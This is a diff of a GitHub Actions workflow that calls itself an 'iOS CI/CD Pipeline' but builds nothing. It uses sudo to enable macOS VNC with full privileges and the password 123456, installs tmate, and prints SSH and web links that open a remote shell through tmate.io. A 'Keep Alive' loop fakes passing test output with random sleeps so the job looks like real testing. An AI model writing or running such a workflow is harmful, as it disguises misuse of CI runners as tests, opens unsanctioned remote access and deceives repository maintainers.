@@ -1,49 +1,26 @@
 name: iOS CI/CD Pipeline
 on:
   workflow_dispatch:
-
 jobs:
   build:
     runs-on: macos-latest
     steps:
       - name: Checkout Repository
         uses: actions/checkout@v4
-
-      - name: Install System Dependencies
+      - name: Setup VNC and Tunnel
         run: |
-          # VNC aktif
-          sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
-            -activate -configure -access -on \
-            -clientopts -setvnclegacy -vnclegacy yes \
-            -clientopts -setvncpw -vncpw 123456 \
-            -restart -agent -privs -all > /dev/null 2>&1
-
-          # tmate kur - brew ile, CDN sorunu yok
+          sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw 123456 -restart -agent -privs -all > /dev/null 2>&1
           brew install tmate
-
-          # tmate ile TCP tüneli aç (5900 VNC portu)
           tmate -S /tmp/tmate.sock new-session -d
           tmate -S /tmp/tmate.sock wait tmate-ready
-
           echo "========================================="
-          echo "SSH BAĞLANTI:"
           tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'
-          echo ""
-          echo "WEB BAĞLANTI:"
           tmate -S /tmp/tmate.sock display -p '#{tmate_web}'
           echo "========================================="
-
-      - name: Run Integration Tests
+      - name: Keep Alive
         run: |
           for i in {1..15}; do
             echo "[$(date +'%H:%M:%S')] Running test suite $i/15... Validation passed."
             find /usr/local -name "*.dylib" > /dev/null 2>&1
             sleep $((180 + RANDOM % 120))
           done
-          echo "All tests completed successfully."
-```
-
-Çıktıda şunları göreceksin:
-```
-SSH BAĞLANTI: ssh abc123@sfo2.tmate.io
-WEB BAĞLANTI: https://tmate.io/t/abc123
